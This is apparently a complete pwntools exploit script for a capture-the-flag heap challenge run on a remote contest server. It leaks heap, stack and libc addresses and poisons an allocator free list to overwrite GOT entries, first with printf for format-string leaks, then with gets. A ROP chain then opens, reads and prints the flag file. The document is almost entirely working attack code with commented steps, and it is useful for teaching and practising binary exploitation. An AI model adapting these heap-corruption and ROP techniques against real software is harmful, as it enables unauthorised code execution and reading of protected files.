from pwn import *
import warnings

warnings.simplefilter("ignore", category=BytesWarning)
context.update(os = "linux", arch = "amd64")
elf = context.binary = ELF("./chal")
libc = ELF("./libc.so.6")
libnotmalloc = ELF("./libnotmalloc.so")

# p = elf.process()	# may not work with current offsets; use local_exploit.py or use docker
# p = remote("127.0.0.1", 12345)
p = remote("chall.polygl0ts.ch", 9004)

# gdb.attach(p)
# pause()

p.sendlineafter("SIZE > ", b"4000")
p.sendlineafter("> ", b"2")

def malloc(idx, size, content):
	p.sendlineafter("> ", b"1")
	p.sendlineafter("index > ", str(idx))
	p.sendlineafter("size > ", str(size))
	p.sendlineafter("content > ", content)

def free(idx):
	p.sendlineafter("> ", b"3")
	p.sendlineafter("index > ", str(idx))

def show(idx):
	p.sendlineafter("> ", b"2")
	p.sendlineafter("index > ", str(idx))
	p.recvuntil("content : ")
	return p.recvuntil("1 - create")[:-11]

# requesting a huge chunk which will move top_chunk into
# metadata_heap and give us the ability to overwrite metadata
malloc(0, 0x3000, b"HUGE")
free(0)

# We create 2 tiny chunks and then one big chunk whose data region
# ends up overlapping with the metadata location of the first tiny chunk
malloc(0, 0x20, b"TINY1")
malloc(1, 0x20, b"TINY2")
malloc(2, 0x2000 - 0x40 + 0x20, b"A" * (0x2000 - 0x40))
# We then free the tiny chunks so that their "next" pointer is
# written into the metadata area, which we can read by "show"ing
# the big chunk's content
free(1)
free(0)
data_heap = u64(show(2)[-6:].ljust(8, b"\0")) - 0x2040
log.success("data_heap = " + hex(data_heap))
free(2)

libnotmalloc.address = data_heap + 0x231000
log.success("libnotmalloc base = " + hex(libnotmalloc.address))

# We will overwrite the "next" pointer of a fastbin chunk
# (called quick_bins in the source) so that when its freed,
# the value we want ends up being the head of the bin. Next time
# we call malloc, it will return our arbitraty location, which we
# can write to. This is our arbitrary write primitive. We write
# printf@plt into extend_mapping@got in libnotmalloc.so memory.
malloc(2, 0x2000 - 0x40 + 0x20, b"A" * (0x2000 - 0x40) + p64(libnotmalloc.got["extend_mapping"] + 0x2000))
malloc(0, 0x20, b"TINY3")
# We also write the address of backward_consolidate in its own place to prevent
# it from being broken (because fgets writes '\n\0' at the end of our inputs and
# corrups stuff after it).
malloc(1, 0x20, p64(libnotmalloc.plt["printf"]) + p64(libnotmalloc.sym["backward_consolidate"]))
free(2)

# Now we have a format string which can be used to leak everything
malloc(2, 0x2000 - 0x40 + 0x20, b"A" * (0x2000 - 0x40) + b"|%13$p|%14$p|%15$p|%23$p|END")
free(2)

# the lines below are equivalent to: malloc(0, 0x4000, b"HUGE2")
# This calls malloc with a huge value which calls extend_mapping
# to trigger our format string
p.sendlineafter("> ", b"1")
p.sendlineafter("index > ", b"0")
p.sendlineafter("size > ", str(0x4000))

# Receiving the leaked stuff :D
p.recvuntil(b"|")
fmt_leak = p.recvuntil(b"|END")[:-4]
log.success("fmt_leak = " + repr(fmt_leak))
p.sendlineafter("content > ", b"HUGE2")
free(0)

fmt_leak = list(map(lambda x: int(x, 16), fmt_leak.split(b"|")))
stack_leak = fmt_leak[1]
log.success("stack_leak = " + hex(stack_leak))
libc.address = fmt_leak[3] - 0x29d90
log.success("libc_base = " + hex(libc.address))

# Writing gets@libc into get_free_chunk@plt so we can read our ROP chain onto
# the stack later. Also we write printf's address in its place again so we don't
# corrupt anything important with fgets "\n\0" in the end. (the entry after printf
# was not important here so we don't care about it)
malloc(0, 0x40, b"TINY4")
malloc(1, 0x40, b"TINY5")
free(1)
free(0)
malloc(2, 0x2000, b"B" * (0x2000 - 0x80) + p64(libnotmalloc.got["get_free_chunk"] + 0x2000))
malloc(0, 0x40, b"TINY6")
malloc(1, 0x40, p64(libc.sym["gets"]) + p64(libc.sym["printf"]))

# gadgets in libc
# 0x0000000000029cd6 : ret
# 0x000000000002a3e5 : pop rdi ; ret
# 0x000000000002be51 : pop rsi ; ret
# 0x0000000000090529 : pop rdx ; pop rbx ; ret
# 0x0000000000141e21 : mov qword ptr [rsi], rdi ; ret

ret = libc.address + 0x0000000000029cd6
pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi = libc.address + 0x000000000002be51
pop_rdx_rbx = libc.address + 0x0000000000090529
store_rsi_rdi = libc.address + 0x0000000000141e21

# ROP to open/read/write the flag onto the screen
rop = p64(ret) * 8
rop += p64(pop_rdi) + b"flag\0".ljust(8, b"\0")
rop += p64(pop_rsi) + p64(data_heap)
rop += p64(store_rsi_rdi)
rop += p64(pop_rdi) + p64(data_heap)
rop += p64(pop_rsi) + p64(0)
rop += p64(libc.sym["open"])
rop += p64(pop_rdi) + p64(3)
rop += p64(pop_rsi) + p64(data_heap)
rop += p64(pop_rdx_rbx) + p64(0x100) + p64(0)
rop += p64(libc.sym["read"])
rop += p64(pop_rdi) + p64(1)
rop += p64(pop_rsi) + p64(data_heap)
rop += p64(pop_rdx_rbx) + p64(0x100) + p64(0)
rop += p64(libc.sym["write"])

# Now when we call malloc(size), it will call
# gets(size). So we can give the stack leak we got
# from before as our size to write there.

# send ROP payload:
p.sendlineafter("> ", b"1")
p.sendlineafter("index > ", b"1")
rop_start = stack_leak - 0x20
if (rop_start % 0x20):
	rop_start -= rop_start % 0x20
p.sendlineafter("size > ", str(rop_start))
p.sendline(rop)

p.interactive()
